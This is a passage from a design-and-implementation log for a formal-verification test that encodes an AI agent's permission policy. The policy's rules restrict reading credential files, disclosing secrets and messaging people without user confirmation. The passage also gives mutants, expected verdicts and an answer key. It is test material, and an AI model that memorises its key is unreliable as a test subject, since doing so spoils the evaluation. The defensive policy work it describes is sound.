| m3 | shorten rule 2's guard to "that action is confirmed by the user" (the exception-does-not-inherit trap) | only one verdict changes: a27 becomes APPROVED {2}. Rule 2 joins the deciding set of a12, a17, a19, a23, a29, a31 and a35. The send_email and post_message gaps close for the wrong reason; the get_secret, schedule_task and spawn_agent gaps stay (their witnesses are unconfirmed) |
| m4 | delete the closure sentence for `reads` from a01's record | a01 becomes UNDETERMINED, U = {1, 13, 24}: an unknown further file could be outside the workspace or a credential file, so neither 13 nor 24 is ruled out, and rule 1's selection (which needs them silent) is no longer provable |
| m5 | remove rule 12 from rule 24's exception list | a06 becomes CONFLICT (12 vs 24); pair (12, 24) becomes satisfiable; rule 12 no longer never-deciding |
| m6 | add `@a36 is confirmed by the user` (replacing the negative fact) | a36 becomes APPROVED {11} |

## 12. Deviations (after running VE; empty at plan time)

Each entry gives the section and cell, the old value, the new value and the reason. A wording change to a rule
must keep the paraphrase in 3.3.

**Plan review fixes, applied before any VE run** (`agent-policy-planreview.final.md`, verdict FIX). The review
confirmed all 42 base verdicts, deciding-rule sets, default outcomes and totals, so sections 6 and 7 are unchanged.

- Finding A (section 8): the Lean `norms-route` rejects data flags. The flag-free fallback and its guarantees are
  now written out after the table in section 8.
- Finding B (section 11, m2): the new permission now overrides nothing and is overridden by all 12 negative
  rules. Its expected changes now list a29's deciding set, the pair count and the new overlap.
- Finding B (sections 4.1, 8 and 9, M8): 39 records are complete, not 40. a42 is excluded from the finite-model
  differential; M8 now expects 39/39.
- Finding C (section 1): the Claude Code source URL is corrected. Step 0 pins the pages in `sources.md`.

**Implementation deviations (2026-09-29).** VE agreed with every entry of sections 6 and 7 and with every
expected mutant change in section 11, so no key entry is corrected. The deviations below change how the
use case is written or computed, not what the key expects.

1. **Step 0 probe results.** `data@0 × norms@0` is accepted, and `$string` literals work in guards. Every rule
   parses with one reading, and `render_english` reproduces `policy.ve` byte for byte. A finite model may hold a
   `$string` element that is no declared literal, so an action with an undeclared tool is a gap with a witness,
   not OPEN (section 7). The Lean P0 `certificate` kind accepts data flags; the Lean `norms-route` does not
   (finding A). The prover result is item 6.
2. **Section 3.1, wording of the base predicates.** VE's vocabulary lint admits a unary wording only as "is"
   plus one word, and a binary wording only as a verb phrase without articles. Wordings it rejects fall back to
   `is classified as "…"`, which is not plain English. The predicates were therefore renamed and reworded as
   below; each description still names the decider.

   | Plan | VE predicate and wording |
   |---|---|
   | `tool`, "{0} uses the tool {1}" | `tool`, "{0} uses {1}"; VE writes a functional attribute as "the tool of {0} is {1}" |
   | `sends_to`, "{0} sends a message to {1}" | `messages`, "{0} messages {1}" |
   | `inside_workspace(file)`, "{0} is inside the workspace" | `resides_in(file, directory)`, "{0} resides in {1}", with the constant `workspace`; negative "{0} does not reside in {1}" |
   | `credential_file`, "{0} is a credential file" | `confidential`, "{0} is confidential" (on the resolver's credential path list) |
   | `version_controlled`, "{0} is under version control" | `tracked`, "{0} is tracked" |
   | `allowlisted`, "{0} is on the network allowlist" | `allowlisted`, "{0} is allowlisted" |
   | `is_user`, "{0} is the user" | `principal`, "{0} is principal" (the user the agent works for) |
   | `confirmed`, "{0} is confirmed by the user" | `confirmed`, "{0} is confirmed" |
   | `read_only`, "{0} is read-only" | `readonly`, "{0} is readonly" |
   | `elevated`, "{0} runs with elevated privileges" | `privileged`, "{0} is privileged" |
   | `discloses_secret(action)`, "{0} discloses a secret" | `discloses(action, secret)`, "{0} discloses {1}", with a new sort `secret`; a record states it like any other effect, with a closure sentence |
   | `within_limit`, "{0} is within the spending limit" | `affordable`, "{0} is affordable" |
   | `reported`, "{0} is reported to the user" | `reported`, "{0} is reported" |

   Each unary predicate also declares its negative wording ("is not confirmed"), so no guard needs "it is not
   the case that".
3. **Section 3.3, rule text.** VE's compact "both A and B" joins two atoms only. Rules 2 and 8 therefore put the
   confirmation inside the existential ("there is a file such that both that action reads that file and that
   action is confirmed"), which has the same meaning. Rule 12 needs three conjuncts. It is written as "…, if
   there is a file such that both that action reads that file and that file is confidential, unless that action
   is not confirmed". That selects exactly the same actions, because a rule applies when its guard holds and its
   carve-out fails. The exception lists use VE's rendered form "1, 2, 3, …, 11, 12".
4. **Section 3.3, rule 25.** A disjunction of an atom and an existential has no one-line English form without
   listing markers. Rule 25 is therefore two rule blocks: Rule 25 (`report-delete`) and Rule 26
   (`report-purchase`), both positive rules on `report_required`. The key's "rule 25" column is read as "rule 25
   or rule 26 selects". Mutant m2's rule M is Rule 27, `message-others-confirmed`.
5. **Sections 4.1 and 4.2, the log.** The closure sentences read "For every file that "a01" reads, that file is
   the same as "f_main"." and "It is not the case that there is a file such that "a01" writes that file." With
   two objects they end "…, or both". The log's names (actions, files, hosts, people and two secrets) are declared
   in `log.vocabulary.json`. Each action's sub-log is checked in an environment that declares only that action's
   name. The reason is that `tool` is total: each extra action name adds Background work, and with all 42 names
   VE's prover exhausted its budget on a one-step query. `emit_log.py` stands in for the agent's tools and writes
   `log.ve` from the section 4.3 table.
6. **Section 5, how the definitions are computed.** VE's prover reaches its step limit (ResourceLimit at 20,000
   steps) on the selection formula of a positive rule, which negates 12 guards. It also fails on
   `prove_norm_entailment` with the full layers. The harness therefore works in stages. VE's prover proves, for
   each rule, that its guard and carve-outs hold or fail for the action. A focused search (`focused.py`) then
   proves each selection formula, and each completed outcome, from those lemmas. The search only chooses among
   VE's own tableau rules. VE's checker replays every certificate it emits, and Lean replays them too. The section
   5 definitions are unchanged: every S+, S− and U membership rests on a chain of certificates, or on two checked
   models of the same sub-log that disagree.
7. **Section 5, completed outcomes.** Each predicate's completed outcome is computed under its own two defaults:
   `permitted` in `deny-neednot` and `allow-neednot`, and `report_required` in `deny-neednot` and `deny-must`. The
   selection formulas are identical in all four environments (a test checks this), so every verdict is too.
8. **Section 7, gap queries.** Each per-tool proof uses only that tool's sentence of `log-schema.ve`. Fewer
   premises keep a proof valid for the whole schema. Gap witnesses are record models, record models with one
   atom changed, or record models whose tool is replaced by an undeclared string.
9. **Section 8, Lean.** The flag-free fallback runs as planned. `report_required` is also certified on the norms
   route as a sub-document of the two obligation rules, because the route certifies a document only when every
   target has a certificate. The completed-outcome certificates are replayed on the P0 route in a copy of the
   environment that declares the two regulated predicates as ordinary predicates, with the layers as premises.
10. **Section 11, m3.** Rule 2 joins seven deciding sets, so seven same-sign overlaps with rule 2 appear too. This
    follows from the named change and is not a separate result.
11. **Section 13, files and entries.** The mutants are text edits in `mutants.py`, not a `mutants/` directory.
    Extra files: `environments.py`, `environment.lean.json`, `emit_log.py`, `log.vocabulary.json`, `focused.py`
    and `results.json`. The harness also uses private `ve` helpers (`_instantiate`, `_any`, `_bind`,
    `_used_predicates`) and the tableau internals that `focused.py` needs. No `ve/` or `lean/` file changed.
12. **Section 1, sources.** `sources.md` pins the pages with their SHA-256. The Codex `docs/sandbox.md` now only
    links to other pages, so the linked sandboxing page is pinned too. The Cedar authorization page, which states
    "forbid overrides permit", replaces the documentation home page.

## 13. Implementation steps and files (for the implementation round, not this commit)

0. **Probes**, recorded in section 12 before any verdict is computed:
   - `data@0 × norms@0` accepted; `$string` literals in guards;
   - every rule parses with one reading; closure-sentence wording;
   - an unnamed `$string` element allowed in witnesses;
   - prover budgets on 24-rule selection formulas;
   - which Lean route kinds exist for the harness queries;
   - pin the section 1 sources.
1. `environment.*.json` (4 files); `policy.ve`; `policy.manifest.json`; `sources.md`.
2. `log.ve` (inventory plus 42 records); `log-schema.ve`; `answer-key.json`. A test checks that it equals the tables in
   sections 6 and 7 of this file.
3. `check.py` (harness: sections 5 and 7 queries, four environments, obligation, finite-model differential);
   `reference_policy.py`; `mutants/`.
4. `tests/test_agent_policy.py` asserts the key, M3 = 0 and the mutants; run in the foreground with
   `PATH=~/.elan/bin:$PATH`.
5. `README.md`: results, metrics M1–M10, the forced-choice table, OPEN list, speech-act list.

The harness uses public `ve` entries (`NormDocument`, `selection`, `check_conflict`, `overlap_witnesses`,
`selected_rules`, `prove_norm_entailment`, the prover and countermodel search) and changes no `ve/` or `lean/` file.
If that turns out to be impossible, the change is proposed separately, not made inside this use case.
